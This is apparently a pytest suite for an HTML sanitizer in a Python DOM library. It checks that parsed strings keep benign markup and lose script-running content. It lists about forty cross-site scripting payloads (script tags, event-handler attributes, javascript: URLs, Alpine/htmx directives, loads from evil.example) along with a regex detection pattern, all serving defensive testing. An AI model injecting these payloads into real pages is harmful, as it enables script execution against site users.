"""F-03: strings parsed as HTML keep safe markup but lose anything that runs code."""

from __future__ import annotations

import os
import random
import re

import pytest

from ux_dom.dom import a, div, p, span
from ux_dom.dom.htmlelement import HTMLElement, JinjaElement, MarkdownElement
from ux_dom.dom.src.component import Component, Fragment
from ux_dom.dom.src.html_string import defHTML
from ux_dom.dom.src.utils import raw


def _component(s):
    class C(Component):
        def render(self):
            return s

    return C()


PATHS = {
    "Fragment": lambda s: Fragment(s),
    "Component": _component,
    "HTMLElement": lambda s: HTMLElement(s),
    "JinjaElement": lambda s: JinjaElement(s),
    "MarkdownElement": lambda s: MarkdownElement(s),
    "defHTML": lambda s: div(*defHTML(s)),
    "defHTML(escape=False)": lambda s: div(*defHTML(s, escape=False)),
}

ATTACKS = [
    "<script>alert(1)</script>",
    "<SCRIPT SRC=//evil.example/x.js></SCRIPT>",
    "<img src=x onerror=alert(1)>",
    "<img src=x OnError=alert(1)>",
    "<svg onload=alert(1)>",
    "<svg><script>alert(1)</script></svg>",
    "<svg><animate attributeName=href values=javascript:alert(1) /></svg>",
    "<svg><set attributeName=onmouseover to=alert(1) /></svg>",
    "<body onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<a href='javascript:alert(1)'>x</a>",
    "<a href=' JaVaScRiPt:alert(1)'>x</a>",
    "<a href='java\tscript:alert(1)'>x</a>",
    "<a href='vbscript:msgbox(1)'>x</a>",
    "<a href='data:text/html,<script>alert(1)</script>'>x</a>",
    "<iframe src=javascript:alert(1)></iframe>",
    "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
    "<object data=javascript:alert(1)></object>",
    "<embed src=javascript:alert(1)>",
    "<form action=javascript:alert(1)><button>x</button></form>",
    "<button formaction=javascript:alert(1)>x</button>",
    "<math><maction xlink:href=javascript:alert(1)>x</maction></math>",
    "<base href=//evil.example/>",
    "<link rel=stylesheet href=//evil.example/x.css>",
    "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>",
    "<style>*{background:url(javascript:alert(1))}</style>",
    "<div style='background:url(javascript:alert(1))'>x</div>",
    "<div style='width:expression(alert(1))'>x</div>",
    "<div x-init='alert(1)'>x</div>",
    "<div x-data='{a: alert(1)}'>x</div>",
    "<div x-html='payload'>x</div>",
    "<button @click='alert(1)'>x</button>",
    "<button x-on:click='alert(1)'>x</button>",
    "<div :class='alert(1)'>x</div>",
    "<div hx-on:click='alert(1)'>x</div>",
    "<div hx-on--click='alert(1)'>x</div>",
    "<div data-hx-on:click='alert(1)'>x</div>",
    "<div hx-get='javascript:alert(1)'>x</div>",
    "<div data-hx-post='javascript:alert(1)'>x</div>",
    "<div _onclick='alert(1)'>x</div>",
]

_DANGER = re.compile(
    r"<script\b|<iframe\b|<object\b|<embed\b|<base\b|<link\b|<meta\b|<style\b"
    r"|<animate\b|<set\b"
    r"|\son[a-z0-9_-]+="
    r"|\sx-[a-z0-9:_-]+="
    r"|\s@[a-z0-9:_-]+="
    r"|\s:[a-z0-9:_-]+="
    r"|hx-on[a-z0-9:_-]*=|srcdoc="
    r"|javascript:|vbscript:|data:text/html|expression\(",
    re.I,
)


@pytest.mark.parametrize("path", sorted(PATHS))
@pytest.mark.parametrize("attack", ATTACKS)
def test_attack_is_neutralized(path, attack):
    out = str(PATHS[path](attack))
    assert not _DANGER.search(out), (path, attack, out)


SAFE = [
    ("<p>hello <b>world</b></p>", ["hello", "world", "<b>", "</b>"]),
    ("<div class='box' id='a'>ok</div>", ["class=", "id=", "ok"]),
    ("<ul><li>one</li><li>two</li></ul>", ["one", "two"]),
    ("<img src='/x.png' alt='pic'>", ["src=", "alt="]),
    ("<a href='/next' title='go'>next</a>", ["href=", "/next"]),
    ("<table><tr><td>1</td></tr></table>", ["1"]),
]


@pytest.mark.parametrize("path", ["Fragment", "Component", "defHTML", "HTMLElement"])
@pytest.mark.parametrize("html,needles", SAFE)
def test_safe_markup_is_kept(path, html, needles):
    out = str(PATHS[path](html))
    for n in needles:
        assert n in out, (path, html, n, out)


def test_braced_data_is_text_not_a_raw_hole():
    # Braces themselves are not HTML-special; the hole was emitting them via
    # escape=False so a "{<script>...}" payload ran. Text now, so tags die.
    out = str(Fragment("{<script>alert(1)</script>}"))
    assert "<script>" not in out
    assert "&lt;script&gt;" in out or "script" not in out.lower() or "{" in out
    plain = str(Fragment("{% for x in xs %}{{ x }}{% endfor %}"))
    assert "<script>" not in plain


def test_raw_opt_out_is_verbatim():
    out = str(div(raw("<script>alert(1)</script>")))
    assert "<script>" in out


def test_tree_nodes_still_accept_trusted_attrs():
    out = str(div(p("hi", **{"data-ux-id": "a"}), a("go", href="/next")))
    assert 'data-ux-id="a"' in out
    assert 'href="/next"' in out


_ALPHABET = "<>\"'/= abcXYZ019scriptonerrorx-init@click:hx-onjavascript:style"


def _walk_attrs(node):
    attrs = getattr(node, "attributes", None) or {}
    yield from attrs.items()
    for child in getattr(node, "children", None) or []:
        if not isinstance(child, str):
            yield from _walk_attrs(child)


def test_property_random_markup_never_emits_runnable_bits():
    from ux_dom.dom.src.html_string import _attr_is_dangerous, _UNSAFE_TAGS
    from ux_dom.dom.src.utils.dom_util import InvalidAttributeName

    rng = random.Random(20261018)
    for _ in range(20 if os.environ.get("MUTGATE") else 400):
        s = "".join(rng.choice(_ALPHABET) for _ in range(rng.randint(1, 80)))
        try:
            nodes = defHTML(s)
        except InvalidAttributeName:
            continue
        for node in nodes:
            tag = (getattr(node, "tagname", None) or type(node).__name__).lower()
            assert tag not in _UNSAFE_TAGS, (s, tag)
            for k, v in _walk_attrs(node):
                assert not _attr_is_dangerous(k, v), (s, k, v)
